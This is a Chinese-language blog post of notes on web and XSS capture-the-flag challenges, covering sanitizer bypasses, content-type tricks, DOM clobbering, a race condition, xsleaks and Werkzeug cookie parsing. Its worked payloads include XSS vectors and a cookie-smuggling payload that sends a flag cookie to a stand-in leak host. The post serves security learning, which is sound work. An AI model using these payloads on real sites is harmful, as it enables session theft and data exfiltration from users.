---
title: 一堆來不及做的 web 與 XSS 題目
date: 2023-12-03 13:40:00
catalog: true
tags: [Security]
categories: [Security]
photos: /img/xss-and-web-challenges/cover.png
---

因為最近有點忙的關係，這兩三個月比較少打 CTF 了，但還是會在推特上看到一些有趣的題目。雖然沒時間打，但筆記還是要記的，沒記的話下次看到鐵定還是做不出來。

這篇主要記一些網頁前端相關的題目，由於自己可能沒有實際下去解題，所以內容都是參考別人的筆記之後再記錄一些心得。

關鍵字列表：

1. copy paste XSS
2. connection pool
3. content type UTF16
4. multipart/mixed
5. Chrome DevTools Protocol
6. new headless mode default download
7. Scroll to Text Fragment (STTF)
8. webVTT cue xsleak
9. flask/werkzeug cookie parsing quirks

<!-- more -->

## DOM-based race condition

來源：https://twitter.com/ryotkak/status/1710291366654181749

題目很簡單，就給你一個可編輯的 div 加上 Angular，允許任何的 user interaction，要做到 XSS。

``` html
<div contenteditable></div>
<script src="https://angular-no-http3.ryotak.net/angular.min.js"></script>
```

當初看到題目的時候有猜到應該跟 copy paste 有關，解答中有提到說在 `<div contenteditable></div>` 貼上內容時，是可以貼上 HTML 的。雖然瀏覽器後來有做 sanitizer，但並不會針對自訂的屬性。

也就是說，如果搭配其他 gadget 的話，還是有機會做到 XSS。

例如說作者的文章中提到的這個 pattern，因為有 AngularJS 的關係所以會執行程式碼：

``` html
<html ng-app>
  <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>
  <div ng-init="constructor.constructor('alert(1)')()"></div>
</html>
```

但問題是使用者在貼入 payload 的時候，AngularJS 已經載入完畢了。載入完成的時候如果 payload 還不存在，那就不會被執行，所以需要延長 AngularJS 載入的時間。

最後作者是用 connection pool 來解決這問題的，就是把 pool 塞爆，就可以延長 script 的載入時間，在載入完成以前貼好 payload。


作者 writeup：https://blog.ryotak.net/post/dom-based-race-condition/

## 罕見的 Content-type 與 UTF16

來源：https://twitter.com/avlidienbrunn/status/1703805922043220273

題目如下：

``` php
<?php
/*
FROM php:7.0-apache

RUN a2dismod status

COPY ./files/index.php /var/www/html
COPY ./files/harder.php /var/www/html
EXPOSE 80

*/
$message = isset($_GET['message']) ? $_GET['message'] : 'hello, world';
$type = isset($_GET['type']) ? $_GET['type'] : die(highlight_file(__FILE__));
header("Content-Type: text/$type");
header("X-Frame-Options: DENY");

if($type == "plain"){
    die("the message is: $message");
}

?>
<html>
<h1>The message is:</h1>
<hr/>
<pre>
    <input type="text" value="<?php echo preg_replace('/([^\s\w!-~]|")/','',$message);?>">
</pre>
<br>
solved by:
<li> nobody yet!</li>
</html>
```

可以控制部分內容以及部分 content type，該怎麼做到 XSS？

第一招是讓 content type 為 `text/html; charset=UTF-16LE`，就可以讓瀏覽器把頁面解讀為 UTF16，控制輸出內容。

這招讓我想到了 [UIUCTF 2022](https://blog.huli.tw/2022/08/01/uiuctf-2022-writeup/) 中的 modernism 那題。

第二招是先運用 content type header 的特性，當 response header 是 `Content-Type: text/x,image/gif` 時，因為 `text/x` 是非法的 content type，所以瀏覽器會優先看合法的 `image/gif`。

也就是說，儘管 content type 的前半段是寫死的，依然可以利用這個技巧覆蓋掉完整的 content type。而有一個古老的 content type 叫做 `multipart/mixed`，像是 response 版的 multipart/form，可以輸出像這樣的 response：

```
HTTP/1.1 200 OK
Content-type: multipart/mixed;boundary="8ormorebytes"


ignored_first_part_before_boundary

--8ormorebytes
Content-Type: text/html

<img src=x onerror=alert(domain)>

--8ormorebytes

ignored_last_part
```

瀏覽器會挑自己看得懂的部分去 render，而 Firefox 有支援這個 content type。

話說這個 content type 還可以拿來繞過 CSP，可以參考這個連結：https://twitter.com/ankursundara/status/1723410507389129092

## Intigriti October 2023 challenge

題目：https://challenge-1023.intigriti.io/

在後端有個注入點：

``` html
<title>Intigriti XSS Challenge - <%- title %></title>
```

這個 title 來自於：

``` js
const getTitle = (path) => {
    path = decodeURIComponent(path).split("/");
    path = path.slice(-1).toString();
    return DOMPurify.sanitize(path);
}
```

雖然說是 DOMPurify，看似不可繞過，但其實用 `<div id="</title><h1>hello</h1>">` 可以閉合前面的 `<title>`，就可以注入任意 tag。

但這題的 input 是來自於 path，所以要把一些 `/` 弄掉，這邊最後是利用 `innerHTML` 會把屬性 decode 的特性，用 `&sol;` 來取代 `/`，最後湊出這樣的 payload：

```
/<p id="<%26sol%3Btitle><script>alert()<%26sol%3Bscript>">
```

這題的目標是要讀本地檔案，所以 XSS 是不夠的，下一步要想辦法從 XSS 繼續往下延伸。

這題的 flag 有 `--disable-web-security`，SOP 被關掉了，可以讀到其他來源的 response，而 CDP 有 origin 的限制沒辦法完全使用，但有部分功能可以，例如說開啟一個新網頁之類的。

但因為檔案在本地，所以只有 `file:///` 開頭的檔案可以讀到其他本地檔案，因此目標就變成要想辦法在本地弄出一個檔案。

解法是在新的 headless mode 中，下載功能是預設開啟的，所以只要觸發下載以後，就會把檔案存到固定規則的位置，用 CDP 打開以後即可。

作者 writeup：https://mizu.re/post/intigriti-october-2023-xss-challenge

## DOM clobbering

來源：https://twitter.com/kevin_mizu/status/1697625861543923906

題目是一個自製的 sanitizer：

``` js
class Sanitizer {
    // https://source.chromium.org/chromium/chromium/src/+/main:out/android-Debug/gen/third_party/blink/renderer/modules/sanitizer_api/builtins/sanitizer_builtins.cc;l=360
    DEFAULT_TAGS  = [ /* ... */ ];

    constructor(config={}) {
        this.version = "2.0.0";
        this.creator = "@kevin_mizu";
        this.ALLOWED_TAGS = config.ALLOWED_TAGS
            ? config.ALLOWED_TAGS.concat([ "html", "head", "body" ]).filter(tag => this.DEFAULT_TAGS.includes(tag))
            : this.DEFAULT_TAGS;
        this.ALLOWED_ATTS = config.ALLOWED_ATTS
            ? config.ALLOWED_ATTS.filter(attr => this.DEFAULT_ATTRS.includes(attr))
            : this.DEFAULT_ATTRS;
    }

    // https://github.com/cure53/DOMPurify/blob/48bd850cc20190e3896cb6291367c2da2ed2bddb/src/purify.js#L924
    _isClobbered = function (elm) {
        return (
            elm instanceof HTMLFormElement &&
            (typeof elm.nodeName !== 'string' ||
            typeof elm.textContent !== 'string' ||
            typeof elm.removeChild !== 'function' ||
            !(elm.attributes instanceof NamedNodeMap) ||
            typeof elm.removeAttribute !== 'function' ||
            typeof elm.setAttribute !== 'function' ||
            typeof elm.namespaceURI !== 'string' ||
            typeof elm.insertBefore !== 'function' ||
            typeof elm.hasChildNodes !== 'function')
        )
    }

    // https://github.com/cure53/DOMPurify/blob/48bd850cc20190e3896cb6291367c2da2ed2bddb/src/purify.js#L1028
    removeNode = (currentNode) => {
        const parentNode = currentNode.parentNode;
        const childNodes = currentNode.childNodes;

        if (childNodes && parentNode) {
            const childCount = childNodes.length;

            for (let i = childCount - 1; i >= 0; --i) {
                parentNode.insertBefore(
                    childNodes[i].cloneNode(),
                    currentNode.nextSibling
                );
            }
        }

        currentNode.parentElement.removeChild(currentNode);
    }

    sanitize = (input) => {
        let currentNode;
        var dom_tree = new DOMParser().parseFromString(input, "text/html");
        var nodeIterator = document.createNodeIterator(dom_tree);

        while ((currentNode = nodeIterator.nextNode())) {

            // avoid DOMClobbering
            if (this._isClobbered(currentNode) || typeof currentNode.nodeType !== "number") {
                this.removeNode(currentNode);
                continue;
            }

            switch(currentNode.nodeType) {
                case currentNode.ELEMENT_NODE:
                    var tag_name   = currentNode.nodeName.toLowerCase();
                    var attributes = currentNode.attributes;

                    // avoid mXSS
                    if (currentNode.namespaceURI !== "http://www.w3.org/1999/xhtml") {
                        this.removeNode(currentNode);
                        continue;

                    // sanitize tags
                    } else if (!this.ALLOWED_TAGS.includes(tag_name)){
                        this.removeNode(currentNode);
                        continue;
                    }

                    // sanitize attributes
                    for (let i=0; i < attributes.length; i++) {
                        if (!this.ALLOWED_ATTS.includes(attributes[i].name)){
                            this.removeNode(currentNode);
                            continue;
                        }
                    }
            }
        }

        return dom_tree.body.innerHTML;
    }
}
```

內容有參考許多其他的 sanitizer library，像是 DOMPurify 等等。

這題的關鍵是以往對於 form 的 DOM clobber，都是像這樣：

``` html
<form id="test">
    <input name=x>
</form>
```

理所當然地把元素放在 form 裡面，就可以污染 `test.x`。

但其實還有一招是使用 `form` 屬性，就可以把元素放在外面：

``` html
<input form=test name=x>
<form id="test"></form>
```

這一題的 sanitizer 在移除元素時，是這樣做的：

``` js
removeNode = (currentNode) => {
    const parentNode = currentNode.parentNode;
    const childNodes = currentNode.childNodes;

    if (childNodes && parentNode) {
        const childCount = childNodes.length;

        for (let i = childCount - 1; i >= 0; --i) {
            parentNode.insertBefore(
                childNodes[i].cloneNode(),
                currentNode.nextSibling
            );
        }
    }

    currentNode.parentElement.removeChild(currentNode);
}
```

把要刪除的元素底下的 node，都插入到 parent 的 nextSibling 去。

因此，如果 clobber 了 nextSibling，製造出這樣的結構：

``` html
<input form=test name=nextSibling> 
<form id=test>
  <input name=nodeName>
  <img src=x onerror=alert(1)>
</form>
```

就會在移除 `<form>` 時，把底下的節點都插入到 `<input form=test name=nextSibling>` 後面，藉此繞過 sanitizer。

真有趣的題目！雖然知道有 `form` 這個屬性，但還沒想過可以拿來搭配 DOM clobbering。

作者的 writeup：https://twitter.com/kevin_mizu/status/1701922141791211776

## LakeCTF 2023 GeoGuessy

來源是參考這篇 writeup：[XSS, Race Condition, XS-Leaks and CSP & iframe's sandbox bypass - LakeCTF 2023 GeoGuessy](https://www.xanhacks.xyz/p/lakectf2023-geoguessy/)

先來看兩個有趣的 unintended，第一個是利用 cookie 不看 port 的特性，用其他題目的 XSS 來拿到 cookie，不同題目之間如果沒有隔離好就會這樣，例如說 [SekaiCTF 2023 - leakless note](https://blog.maple3142.net/2023/08/27/sekai-ctf-2023-writeups/#leakless-note) 也是。

第二個是寫 code 的 bad practice 造成的 race condition。

在訪問頁面時會去設定 user，這邊的 user 是 global variable：

``` js
router.get('/', async (req, res) => {
    user = await db.getUserBy("token", req.cookies?.token)
    if (user) {
         isPremium = user.isPremium
        username = user.username
        return res.render('home',{username, isPremium});
    } else {
        res.render('index');
    }
});
```

然後 update user 時也是用類似的模式，拿到 user 之後修改資料寫入：

``` js
router.post('/updateUser', async (req, res) => {
    token = req.cookies["token"]
    if (token) {
        user = await db.getUserBy("token", token)
        if (user) {
            enteredPremiumPin = req.body["premiumPin"]
            if (enteredPremiumPin == premiumPin) {
                user.isPremium = 1
            }
            // ...
            await db.updateUserByToken(token, user)
            return res.status(200).json('yes ok');
        }
    }
    return res.status(401).json('no');
});
```

admin bot 每次都會執行 updateUser，把 admin user 的 isPremium 設定成 1。

由於 user 是 global variable，db 的操作又是 async 的，所以如果速度夠快的話，updateUser 裡的 user 會是另一個 user，就可以把自己的 user 設定成 premium account。

intended 的話是用 Scroll to Text Fragment (STTF) 來解。

## N1CTF - ytiruces

參考資料：

1. https://dem0dem0.top/2023/10/20/n1ctf2023/
2. https://nese.team/posts/n1ctf2023/

用 WebVTT，一個顯示字幕的格式搭配 CSS selector  `video::cue(v[voice^="n1"])` 來 xsleak。

https://developer.mozilla.org/en-US/docs/Web/CSS/::cue

真是有趣的 selector。

## Werkzeug cookie parsing quirks

來源：[Another HTML Renderer](https://mizu.re/post/another-html-renderer)

這題又是來自於 [@kevin_mizu](https://twitter.com/kevin_mizu)，前面已經有介紹過兩題他出的題目了，而這題又是一個有趣的題目！

這題有一個 admin bot 會設定 cookie，裡面有 flag，所以目標就是偷到這個 cookie，而核心程式碼如下：

``` py
@app.route("/render")
def index():
    settings = ""
    try:
        settings = loads(request.cookies.get("settings"))
    except: pass

    if settings:
        res = make_response(render_template("index.html",
            backgroundColor=settings["backgroundColor"] if "backgroundColor" in settings else "#ffde8c",
            textColor=settings["textColor"] if "textColor" in settings else "#000000",
            html=settings["html"] if "html" in settings else ""
        ))
    else:
        res = make_response(render_template("index.html", backgroundColor="#ffde8c", textColor="#000000"))
        res.set_cookie("settings", "{}")

    return res
```

Python 這邊主要會根據 cookie 內的參數來 render 頁面，template 如下：

``` html
<iframe
  id="render"
  sandbox=""
  srcdoc="<style>* { text-align: center; }</style>{{html}}"
  width="70%"
  height="500px">
</iframe>
```

就算控制了 html，也只能在 sandbox iframe 裡面，不能執行程式碼，也不是 same origin。但以往如果要偷 cookie 的話，基本上都需要先有 same-origin 的 XSS 才行。

而前端的部分可以設定 cookie，但會過濾掉 `html` 這個字，所以不讓你設定 html：

``` js
const saveSettings = (settings) => {
    document.cookie = `settings=${settings}`;
}

const getSettings = (d) => {
    try {
        s = JSON.parse(d);
        delete s.html;
        return JSON.stringify(s);
    } catch {
        while (d != d.replaceAll("html", "")) {
            d = d.replaceAll("html", "");
        }
        return d;
    }
}

window.onload = () => {
    const params = (new URLSearchParams(window.location.search));
    if (params.get("settings")) {
        window.settings = getSettings(params.get("settings"));
        saveSettings(window.settings);
        renderSettings(window.settings);
    } else {
        window.settings = getCookie("settings");
    }
    window.settings = JSON.parse(window.settings);
```

那這題到底要怎麼解呢？這一切都與 werkzeug 解析 cookie 時的邏輯有關。

先來講如何繞過那個 html 的檢查，在 werkzeug 裡面如果你的 cookie value 是用 `""` 包住的話，會先進行 decode，因此 `"\150tml"`  會被 decode 成 `"html"`，就可以繞過對於 html 關鍵字的檢查。

但繞過之後，要怎麼拿到 flag 呢？這就要用到 werkzeug 第二個解析 cookie 的特殊之處了。當 werkzeug 在解析 cookie 時，如果碰到 `"` 時，就會解析到下一個 `"` 為止。

舉例來說，假設 cookie 的內容是這樣：

```
Cookie: cookie1="abc; cookie2=def";
```

最後得到的結果會是：`"cookie1": "abc; cookie2=def"`

也就是說，如果我們在 flag 的前後各夾一個 cookie，就可以讓 flag 包含在 html 裡面，讓 flag 的內容出現在 html 中，再用其他任何方式把 cookie 拿走，底下直接用作者的 payload：

```
Cookie: settings="{\"\150tml\": "<img src='https://leak-domain/?cookie= ;flag=GH{FAKE_FLAG}; settings='>\"}"
```

看完這題才突然想到以前 DiceCTF 2023 也出現過類似的題目，那時候是 jetty 有這個行為：[Web - jnotes (6 solves)](https://blog.huli.tw/2023/03/26/dicectf-2023-writeup/#web-jnotes-6-solves)，看來搞不好還不少 web framework 有這個 parsing 行為。